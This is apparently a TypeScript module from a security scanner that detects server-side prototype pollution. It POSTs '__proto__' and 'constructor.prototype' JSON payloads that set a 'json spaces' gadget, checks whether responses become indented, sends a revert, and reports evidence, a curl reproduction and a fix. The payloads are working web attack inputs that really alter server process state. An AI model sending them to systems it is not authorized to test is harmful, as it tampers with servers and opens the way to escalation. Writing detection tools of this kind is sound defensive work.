// Server-side prototype-pollution probe (AGGRESSIVE tier). Proves — never just
// guesses — that an endpoint deep-merges attacker JSON into an object without a
// __proto__/constructor guard, by using the well-known non-destructive "json
// spaces" gadget: after polluting Object.prototype["json spaces"], any code path
// that formats a JSON response by reading that key via unguarded bracket access
// (extremely common in real apps; note modern Express hardened its OWN
// app.get('json spaces') read, so the observable comes from the app's own
// config read, not the framework's) switches from compact to indented output.
// The proof is a clean differential on RESPONSE FORMATTING: a benign body comes
// back compact, the gadget body comes back indented by exactly our gadget width.
//
// SAFETY: this is the one probe in the codebase that leaves a transient trace —
// proving server-side prototype pollution inherently requires triggering a real
// (here cosmetic: JSON whitespace) side effect. It is gated to the aggressive,
// ownership-verified tier, uses a benign, self-healing gadget (whitespace only,
// gone on the app's next restart), and issues a best-effort revert (setting the
// gadget back to 0) immediately after proving the finding.
import { safeFetch } from "./ssrf.js";
import type { RedTeamFinding } from "./scanTypes.js";
import type { ExploitEvidence } from "../src/types.js";
import { renderRawRequest } from "./evidence.js";

const GADGET_SPACES = 7; // distinctive, uncommon indentation width → unambiguous signal
const INDENT = "\n" + " ".repeat(GADGET_SPACES); // what JSON.stringify(x, null, 7) emits per level

// Raw JSON strings (not JS objects) so the literal "__proto__" / "constructor"
// keys are sent verbatim without any host-language prototype-setter ambiguity.
const BASELINE_BODY = '{"seclayerProbe":"baseline"}';
const GADGETS: Array<{ label: string; body: string; revert: string }> = [
  { label: "__proto__", body: `{"__proto__":{"json spaces":${GADGET_SPACES}}}`, revert: '{"__proto__":{"json spaces":0}}' },
  { label: "constructor.prototype", body: `{"constructor":{"prototype":{"json spaces":${GADGET_SPACES}}}}`, revert: '{"constructor":{"prototype":{"json spaces":0}}}' },
];

function looksJson(text: string): boolean {
  const s = text.trim();
  return s.startsWith("{") || s.startsWith("[");
}

async function postRaw(url: string, headers: Record<string, string>, rawBody: string): Promise<{ res: Response; text: string }> {
  const ctl = new AbortController();
  const id = setTimeout(() => ctl.abort(), 5000);
  try {
    const res = await safeFetch(url, {
      method: "POST",
      headers: { ...headers, "Content-Type": "application/json" },
      body: rawBody,
      signal: ctl.signal,
    });
    return { res, text: await res.text().catch(() => "") };
  } finally {
    clearTimeout(id);
  }
}

export async function probePrototypePollution(
  rootUrl: string,
  postUrls: string[],
  headers: Record<string, string>,
): Promise<RedTeamFinding | null> {
  const base = rootUrl.replace(/\/+$/, "");
  // Root first, then every discovered POST endpoint, deduped.
  const candidates = [...new Set([base || rootUrl, ...postUrls])];
  const jsonHeaders = { ...headers, "Content-Type": "application/json" };

  for (const url of candidates) {
    // Baseline: a benign object. We can only observe the gadget through a JSON
    // response body — skip endpoints that don't return one, or that already
    // happen to emit this exact indentation (so a positive can't be pre-existing).
    let baseline: { res: Response; text: string };
    try {
      baseline = await postRaw(url, headers, BASELINE_BODY);
    } catch {
      continue;
    }
    const baseText = baseline.text || "";
    if (!looksJson(baseText) || baseText.includes(INDENT)) continue;

    for (const gadget of GADGETS) {
      let attack: { res: Response; text: string };
      try {
        attack = await postRaw(url, headers, gadget.body);
      } catch {
        continue;
      }
      const attackText = attack.text || "";
      if (!looksJson(attackText) || !attackText.includes(INDENT)) continue;

      // PROVEN: identical endpoint, only the body differs, and the app's JSON
      // output flipped from compact to gadget-width-indented → Object.prototype
      // was polluted process-wide. Best-effort revert to compact formatting.
      try { await postRaw(url, headers, gadget.revert); } catch { /* best effort */ }

      const quote = `${INDENT}"`; // newline + our exact indent + a key's opening quote
      const attackResponse =
        `HTTP/1.1 ${attack.res.status} ${attack.res.statusText}\n\n` +
        (attackText.length > 1500 ? attackText.slice(0, 1500) + "\n[…truncated]" : attackText);
      const evidence: ExploitEvidence = {
        method: "differential",
        attack: { request: renderRawRequest("POST", url, jsonHeaders, gadget.body), response: attackResponse },
        baseline: {
          request: renderRawRequest("POST", url, jsonHeaders, BASELINE_BODY),
          response: `HTTP/1.1 ${baseline.res.status} ${baseline.res.statusText}\n\n` + (baseText.length > 400 ? baseText.slice(0, 400) + "\n[…truncated]" : baseText),
        },
        signal: {
          quote,
          offsetInResponse: attackResponse.indexOf(quote),
          why: `A benign body returned compact JSON, but the "${gadget.label}" gadget body {"json spaces":${GADGET_SPACES}} made the same endpoint return JSON indented by exactly ${GADGET_SPACES} spaces — the app read a polluted Object.prototype["json spaces"] value, proving server-side prototype pollution.`,
        },
        demonstration: `We POSTed a benign JSON object to ${url} and it replied with compact JSON. We then POSTed {"${gadget.label === "__proto__" ? "__proto__" : "constructor"}":…{"json spaces":${GADGET_SPACES}}} and the SAME endpoint replied with JSON indented by ${GADGET_SPACES} spaces. That formatting change comes from the app reading a now-polluted Object.prototype property, so attacker input is being deep-merged into an object without a prototype guard — server-side prototype pollution.`,
        reproduction: `curl -s -X POST "${url}" -H "Content-Type: application/json" --data '${gadget.body}'`,
        capturedAt: new Date().toISOString(),
      };
      return {
        testName: "Server-Side Prototype Pollution (proven via gadget)",
        payload: gadget.body,
        severity: "high",
        description:
          "Active aggressive fuzzing proved server-side prototype pollution: the endpoint deep-merges attacker-controlled JSON into an object without guarding the __proto__/constructor.prototype keys, so a request can set properties on Object.prototype for the whole process. Confirmed non-destructively via the benign \"json spaces\" formatting gadget (a request flipped the app's JSON output from compact to indented). Depending on the gadgets present in the app, this can escalate to denial of service, authorization bypass, or remote code execution.",
        fix: "Guard the merge: reject or skip the keys \"__proto__\", \"constructor\", and \"prototype\" when recursively merging untrusted input, or use a null-prototype target (Object.create(null)) / a Map, or a vetted merge utility that is prototype-pollution-safe. Validate request bodies against a schema so unexpected keys are dropped.",
        evidence,
      };
    }
  }
  return null;
}
